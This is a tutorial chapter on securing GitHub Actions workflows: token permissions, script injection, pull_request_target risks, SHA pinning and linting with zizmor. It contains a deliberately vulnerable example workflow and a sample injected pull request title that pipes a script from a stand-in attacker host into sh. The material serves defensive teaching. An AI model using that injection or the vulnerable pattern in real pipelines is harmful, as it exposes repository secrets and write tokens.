---
title: 'Securing GitHub Actions Workflows'
description: 'Harden GitHub Actions: least-privilege GITHUB_TOKEN, no script injection, safe pull request triggers, SHA-pinned actions, zizmor and runner rules.'
order: 9
---

A CI/CD pipeline holds the keys to everything it deploys: a token that can write to the repository, cloud credentials, the right to publish packages and sites. That makes it a target. The attacks that work in practice are rarely clever. They use a workflow that gives a pull request too much trust, a title that becomes shell code, or an action whose tag was moved to malicious code.

One rule covers most of this part: **code and data from outside your team must never run with your secrets or a write token.** A fork's pull request, an issue comment, a branch name and a third-party action are all "outside". Each section below applies that rule to one part of a workflow, then you check the companion repository with zizmor and pin its actions to commits.

## Prerequisites

- The repository from [Part 8](/guides/introduction-to-cicd/08-monitoring-debugging-and-optimization).
- [zizmor](https://docs.zizmor.sh/), a security linter for GitHub Actions, and actionlint from Part 2.

## Give the Token Only What the Job Needs

Every job gets a `GITHUB_TOKEN`. What it may do comes from the `permissions:` key, and without it from the repository or organization default, which on older organizations is read and write for everything. Set read-only permissions at the top of every workflow and add what a job needs on that job, as `deploy.yml` does:

```yaml
permissions:
  contents: read

jobs:
  deploy:
    permissions:
      pages: write
      id-token: write
```

Once you set `permissions`, every permission you do not list is `none`. The ones you will need most:

| Permission        | `read` lets the job                    | `write` lets the job                   |
| ----------------- | -------------------------------------- | -------------------------------------- |
| `contents`        | Clone the code, download releases      | Push commits and tags, create releases |
| `pull-requests`   | Read pull requests                     | Comment, label, request reviews        |
| `packages`        | Pull from GitHub Packages and GHCR     | Push container images and packages     |
| `id-token`        | (no read level)                        | Request an OIDC token (Part 5)         |
| `pages`           | (not needed)                           | Deploy to GitHub Pages                 |
| `actions`         | List runs and download their artifacts | Cancel and re-run workflows            |
| `security-events` | Read code scanning alerts              | Upload SARIF results                   |
| `attestations`    | Read attestations                      | Create build provenance attestations   |

The "Set up job" log lists the permissions a job really got (Part 1 showed `Contents: read` and `Metadata: read`). Also set **Settings > Actions > General > Workflow permissions** to read-only, so a workflow without a `permissions:` block is safe too.

For access to other repositories, do not use a personal access token. Create a GitHub App and get a short-lived installation token in the job with `actions/create-github-app-token`.

## Treat Event Data as Untrusted

Pull request titles and bodies, branch names, commit messages, issue comments and labels are all chosen by whoever opens them. An expression inside `run:` is pasted into the script before the shell sees it, so `${{ github.event.pull_request.title }}` in a script runs the title as code. Here is a workflow with that mistake and several more:

```yaml
name: Triage

on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Greet the author
        run: echo "Thanks for ${{ github.event.pull_request.title }}"
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test
```

```terminal
{
  "title": "two linters, two views",
  "prompt": "$",
  "steps": [
    {
      "cmd": "actionlint",
      "output": ".github/workflows/triage.yml:12:35: \"github.event.pull_request.title\" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [expression]\n   |\n12 |         run: echo \"Thanks for ${{ github.event.pull_request.title }}\"\n   |                                   ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
    },
    {
      "comment": "--format github prints one line per finding; --quiet drops the progress log",
      "cmd": "zizmor --offline --quiet --format github .github/workflows/triage.yml",
      "output": "::warning file=.github/workflows/triage.yml,line=13,title=artipacked::triage.yml:13: credential persistence through GitHub Actions artifacts: does not set persist-credentials: false\n::warning file=.github/workflows/triage.yml,line=8,title=excessive-permissions::triage.yml:8: overly broad permissions: default permissions used due to no permissions: block\n::error file=.github/workflows/triage.yml,line=4,title=dangerous-triggers::triage.yml:4: use of fundamentally insecure workflow trigger: pull_request_target is almost always used insecurely\n::error file=.github/workflows/triage.yml,line=12,title=template-injection::triage.yml:12: code injection via template expansion: may expand into attacker-controllable code\n::error file=.github/workflows/triage.yml,line=13,title=unpinned-uses::triage.yml:13: unpinned action reference: action is not pinned to a hash (required by blanket policy)"
    }
  ]
}
```

A pull request titled `"; curl https://attacker.example/x.sh | sh; echo "` would run that script on the runner, and with `pull_request_target` it runs with the base repository's secrets and a token that can write. The greeting step comes first, so it runs even though `actions/checkout@v7` would then refuse to check out the fork's code. The fix is to pass event data through an environment variable, where the shell treats it as text:

```yaml
- name: Greet the author
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Thanks for $TITLE"
```

The same applies to inputs of `workflow_dispatch` and `workflow_call`, and to outputs of earlier steps that came from untrusted data.

## Choose Pull Request Triggers Carefully

The other findings are about the trigger. GitHub has three ways to run workflows for pull requests, and they differ in exactly the thing that matters:

| Trigger               | Workflow code from | Secrets and token for fork pull requests | Use for                                                   |
| --------------------- | ------------------ | ---------------------------------------- | --------------------------------------------------------- |
| `pull_request`        | The pull request   | No secrets; read-only token              | Building and testing pull request code: almost everything |
| `pull_request_target` | The default branch | Secrets and a write token                | Labeling or commenting, without running pull request code |
| `workflow_run`        | The default branch | Secrets and a write token                | Acting on the results of a `pull_request` run             |

`pull_request` is safe for fork pull requests because the run gets no secrets. `pull_request_target` and `workflow_run` exist for the few jobs that need a write token on a pull request, such as adding a label. The classic attack, often called a **pwn request**, is a `pull_request_target` workflow that checks out and runs the pull request's code, like the one above. Two changes made it harder:

- Since [8 December 2025](https://github.blog/changelog/2025-11-07-actions-pull_request_target-and-environment-branch-protections-changes/), `pull_request_target` always runs the workflow from the default branch, so an old, vulnerable copy on another branch can no longer be used.
- `actions/checkout@v7` ([June 2026](https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout/)) refuses to check out fork pull request code in `pull_request_target` and `workflow_run` runs unless you set `allow-unsafe-pr-checkout: true`. Since 20 July 2026, workflows that use a floating major tag such as `@v4` get the same check.

Neither stops a `run: git fetch` of the pull request, or a workflow that downloads and runs an artifact from an untrusted run. The [pwn request post](/posts/pwn-request-github-actions-checkout-v7) covers those gaps. In practice: use `pull_request` for anything that runs pull request code, and in `pull_request_target` and `workflow_run` workflows, never execute anything that came from the pull request.

Two settings help as well. **Settings > Actions > General > Approval for running fork pull request workflows** decides whether first-time or all outside contributors need an approval before their pull requests run workflows at all. And since [July 2026](https://github.blog/changelog/2026-07-28-github-actions-holds-potentially-malicious-workflows-for-approval/), GitHub holds workflow runs in public repositories that it considers potentially malicious until a collaborator approves them.

## Pin Actions to Commits

An action is code that runs in your job with your token and secrets. `uses: actions/checkout@v7` refers to a tag, and a tag can be moved to another commit by anyone who controls the action's repository, including an attacker with stolen credentials. That is what happened to `aquasecurity/trivy-action` in March 2026, when 76 of its 77 version tags were moved to code that stole CI secrets. The [Security Gates guide](/guides/security-gates/04-cicd-integration#h2-pin-and-verify-the-gate-tools) tells the story and covers verifying tool downloads and signatures; this section covers the basics.

A full commit SHA cannot be moved. Here is zizmor on the companion repository before pinning, with its default policy, which requires a SHA for every action:

```terminal
{
  "title": "before pinning",
  "prompt": "$",
  "steps": [
    {
      "cmd": "zizmor --offline --quiet --format github .github/",
      "output": "::error file=.github/actions/setup-app/action.yml,line=12,title=unpinned-uses::action.yml:12: unpinned action reference: action is not pinned to a hash (required by blanket policy)\n::error file=.github/workflows/ci.yml,line=20,title=unpinned-uses::ci.yml:20: unpinned action reference: action is not pinned to a hash (required by blanket policy)\n::error file=.github/workflows/ci.yml,line=38,title=unpinned-uses::ci.yml:38: unpinned action reference: action is not pinned to a hash (required by blanket policy)\n::error file=.github/workflows/ci.yml,line=51,title=unpinned-uses::ci.yml:51: unpinned action reference: action is not pinned to a hash (required by blanket policy)\n::error file=.github/workflows/ci.yml,line=62,title=unpinned-uses::ci.yml:62: unpinned action reference: action is not pinned to a hash (required by blanket policy)\n::error file=.github/workflows/ci.yml,line=81,title=unpinned-uses::ci.yml:81: unpinned action reference: action is not pinned to a hash (required by blanket policy)\n::warning file=.github/workflows/ci.yml,line=23,title=self-repository::ci.yml:23: use GitHub's dedicated self-repository syntax: use '$/...' instead of './...'\n::warning file=.github/workflows/ci.yml,line=41,title=self-repository::ci.yml:41: use GitHub's dedicated self-repository syntax: use '$/...' instead of './...'\n::warning file=.github/workflows/ci.yml,line=65,title=self-repository::ci.yml:65: use GitHub's dedicated self-repository syntax: use '$/...' instead of './...'\n::error file=.github/workflows/deploy.yml,line=27,title=unpinned-uses::deploy.yml:27: unpinned action reference: action is not pinned to a hash (required by blanket policy)\n::error file=.github/workflows/deploy.yml,line=32,title=unpinned-uses::deploy.yml:32: unpinned action reference: action is not pinned to a hash (required by blanket policy)\n::error file=.github/workflows/deploy.yml,line=52,title=unpinned-uses::deploy.yml:52: unpinned action reference: action is not pinned to a hash (required by blanket policy)\n::warning file=.github/workflows/deploy.yml,line=18,title=self-repository::deploy.yml:18: use GitHub's dedicated self-repository syntax: use '$/...' instead of './...'"
    }
  ]
}
```

To pin, look up the commit of each release tag. The GitHub API resolves a tag to its commit:

```terminal
{
  "title": "tags to commits",
  "prompt": "$",
  "steps": [
    {
      "cmd": "for ref in actions/checkout@v7.0.1 actions/setup-node@v7.1.0 actions/upload-artifact@v7.0.2 actions/download-artifact@v8.0.2 actions/upload-pages-artifact@v5.0.0 actions/deploy-pages@v5.0.1; do\n  echo \"${ref%@*} ${ref#*@} $(gh api \"repos/${ref%@*}/commits/${ref#*@}\" --jq .sha)\"\ndone",
      "output": "actions/checkout v7.0.1 3d3c42e5aac5ba805825da76410c181273ba90b1\nactions/setup-node v7.1.0 949feb2413d6458794dcd2491c4babbbce0c15c1\nactions/upload-artifact v7.0.2 cf430e030ddbb5b0abf93d22962f4752f3646cd9\nactions/download-artifact v8.0.2 9000827ccba6bdab643e8b6fd33ac0654aef8333\nactions/upload-pages-artifact v5.0.0 fc324d3547104276b827a68afc52ff2a11cc49c9\nactions/deploy-pages v5.0.1 368f82528645a54fb793d4d04e342629a3f51346"
    }
  ]
}
```

Then replace every reference, keeping the version in a comment so people and Dependabot can read it:

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  with:
    persist-credentials: false
```

After pinning, zizmor finds only the `$/` suggestion from Part 7. Without `--offline`, and with a `GH_TOKEN`, it also checks that each pinned commit really belongs to the repository it claims (a fork can create an "impostor" commit that is reachable under the original name) and whether a pinned version has a known advisory:

```terminal
{
  "title": "after pinning",
  "prompt": "$",
  "steps": [
    {
      "cmd": "zizmor --quiet --format github .github/",
      "output": "::warning file=.github/workflows/ci.yml,line=23,title=self-repository::ci.yml:23: use GitHub's dedicated self-repository syntax: use '$/...' instead of './...'\n::warning file=.github/workflows/ci.yml,line=41,title=self-repository::ci.yml:41: use GitHub's dedicated self-repository syntax: use '$/...' instead of './...'\n::warning file=.github/workflows/ci.yml,line=65,title=self-repository::ci.yml:65: use GitHub's dedicated self-repository syntax: use '$/...' instead of './...'\n::warning file=.github/workflows/deploy.yml,line=18,title=self-repository::deploy.yml:18: use GitHub's dedicated self-repository syntax: use '$/...' instead of './...'"
    }
  ]
}
```

Pins are only safe if they are updated, or you keep old bugs forever. Let Dependabot do it. It updates the SHA and the version comment together, and a `cooldown` waits a few days after a release before proposing it, which gives the community time to notice a compromised release:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
    groups:
      actions:
        patterns: ['*']
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
```

Three more tools exist. An organization or repository policy can require SHA pinning, so unpinned workflows fail ([August 2025](https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/)); the same policy can allow only actions you have reviewed. **Workflow lockfiles** (public preview since [14 October 2026](https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/)) keep readable tags in the workflow and record the exact commits, including those of actions that your actions use, in `.github/workflows/actions.lock`, maintained with the `gh actions-lock` extension. And **immutable releases** (generally available since October 2025) let action authors publish releases whose tags cannot be moved; GitHub's separate plan for "immutable actions" published as packages was taken off the roadmap in December 2025.

## Check Workflows in CI

Run actionlint and zizmor on every pull request, and make the jobs required. This workflow (checked with actionlint and zizmor, not run in the companion repository) uses actionlint's container image, pinned by digest, and zizmor's official action, which uploads its findings to code scanning:

```yaml
name: Lint workflows

on:
  pull_request:
  merge_group:

permissions: {}

jobs:
  actionlint:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - name: Check the workflow files
        uses: docker://rhysd/actionlint:1.7.12@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667
        with:
          args: -color

  zizmor:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: zizmorcore/zizmor-action@53290badfa369cb0bf7ad16342cb62c2fa47ac7b # v0.8.0
```

In this mode the zizmor job does not fail on findings; they show up as code scanning alerts, and a **Require code scanning results** rule in the ruleset blocks merges on them. With `advanced-security: false` in its `with:` block, the job fails instead. The [Security Gates guide](/guides/security-gates/04-cicd-integration#h2-lint-the-pipeline-itself) explains what each linter catches and what it misses.

Protect the workflow files themselves, too: a pull request that changes `.github/workflows/` can change what CI checks. Add them to `CODEOWNERS` and turn on **Require review from Code Owners** in the branch ruleset:

```text
# .github/CODEOWNERS
/.github/ @my-org/platform-team
```

## Secrets, Caches and Artifacts

The earlier parts covered these; in short:

- **Credentials:** OIDC for clouds, environment secrets for deployments, `GITHUB_TOKEN` or GitHub App tokens for GitHub (Part 5).
- **Checkout credentials:** `persist-credentials: false` on every `actions/checkout` that does not push, so later steps, including a compromised tool, cannot use the token through `git`.
- **Caches:** a cache that a trusted workflow restores can be poisoned by an untrusted one. Events that outsiders can trigger in the default branch's scope get read-only cache access by default, `pull_request` runs write only to their own scope, and an explicit `cache-mode: write` removes that protection (Part 4).
- **Artifacts:** in a public repository, any signed-in user can download them. Never upload secrets, `.env` files or the `.git` directory.

## Self-Hosted Runners

A self-hosted runner is a machine you own that runs jobs. Two rules:

- **Never use self-hosted runners for public repositories.** Anyone who can open a pull request could run code on your machine and inside your network.
- **Give every job a fresh machine.** A runner that serves many jobs keeps files, credentials and processes between them. Create a new VM or container for each job and destroy it afterwards, for example with Actions Runner Controller on Kubernetes or an autoscaler. Register each one with `--ephemeral`, which limits a registration to one job; the flag alone does not clean or replace the machine. Limit which repositories can use the runners with runner groups.

Keep them updated (the minimum version is enforced, as Part 8 described), and treat the machine as untrusted after any job that ran outside code.

## A Checklist

| Check                                                           | Where in this guide |
| --------------------------------------------------------------- | ------------------- |
| `permissions: contents: read` at the top of every workflow      | This part           |
| No `${{ }}` with event data inside `run:`                       | This part           |
| No pull request code in `pull_request_target` or `workflow_run` | This part           |
| Every action pinned to a full commit SHA, updated by Dependabot | This part           |
| actionlint and zizmor run in CI and are required                | This part           |
| `persist-credentials: false` on checkouts that do not push      | Part 1              |
| Cloud access through OIDC with a full `sub` match               | Part 5              |
| Production secrets in a protected environment with reviewers    | Parts 5 and 6       |
| `.github/` owned by a team in `CODEOWNERS`                      | This part           |
| No self-hosted runners on public repositories                   | This part           |

## Common Mistakes

- **`write-all` or no `permissions` block.** Start from `contents: read`.
- **`${{ github.event.* }}` in a script.** Use `env:`.
- **Checking out the pull request in `pull_request_target`.** Use `pull_request`.
- **Tags instead of SHAs for third-party actions.** Tags can move.
- **Pinning without updating.** A pinned action with a known bug is still vulnerable. Use Dependabot with a cooldown.
- **Personal access tokens in secrets.** Use `GITHUB_TOKEN`, a GitHub App token or OIDC.

## Summary

- Outside code and data must never run with your secrets or a write token.
- Set minimal `permissions`, pass event data through `env:`, and keep pull request code in `pull_request` workflows.
- Pin actions to full commit SHAs and let Dependabot update them; zizmor and actionlint check workflows before they run.
- Protect `.github/` with code owners, and keep self-hosted runners away from public repositories.

In [Part 10](/guides/introduction-to-cicd/10-real-world-examples-and-next-steps) you see the finished pipeline, file by file, and patterns for Docker images, Terraform and Kubernetes.

## Keep Learning

- [Security Gates guide](/guides/security-gates): policy, vulnerability and compliance gates in CI, with signed provenance
- [The pwn request just got harder: what actions/checkout v7 changes, and what it does not](/posts/pwn-request-github-actions-checkout-v7)
- [CI/CD Pipeline Hardening: A Practical Guide to Securing Your Build Infrastructure](/posts/cicd-pipeline-hardening-guide)
- [Software Supply Chain Security: SBOMs, Sigstore, and SLSA in Practice](/posts/software-supply-chain-security)
- [Static Application Security Testing (SAST) guide](/guides/sast-tools)
